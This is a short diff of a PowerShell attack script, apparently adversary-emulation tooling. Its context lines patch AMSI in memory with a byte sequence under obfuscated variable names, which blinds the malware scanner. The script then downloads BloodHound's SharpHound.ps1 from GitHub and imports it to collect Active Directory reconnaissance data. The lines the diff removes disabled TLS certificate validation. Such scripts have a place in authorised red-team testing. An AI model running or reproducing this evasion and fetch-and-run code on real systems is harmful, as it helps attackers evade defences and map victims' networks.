@@ -21,19 +21,6 @@ ${lkaknfmklad} = 0
 ${olmsdfvnodifngon} = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
 [System.Runtime.InteropServices.Marshal]::Copy(${olmsdfvnodifngon}, 0, ${oiwuaefnhoiewm}, 6)
 
-add-type @"
-using System.Net;
-using System.Security.Cryptography.X509Certificates;
-public class TrustAllCertsPolicy : ICertificatePolicy {
-    public bool CheckValidationResult(
-        ServicePoint srvPoint, X509Certificate certificate,
-        WebRequest request, int certificateProblem) {
-        return true;
-    }
-}
-"@
-$AllProtocols = [System.Net.SecurityProtocolType]'Ssl3,Tls,Tls11,Tls12'
-[System.Net.ServicePointManager]::SecurityProtocol = $AllProtocols
 Invoke-WebRequest "https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1" -OutFile "c:\test\SharpHound.ps1"
 write-host "Import and Execution of SharpHound.ps1 from c:\test" -ForegroundColor Cyan
 import-module c:\test\SharpHound.ps1
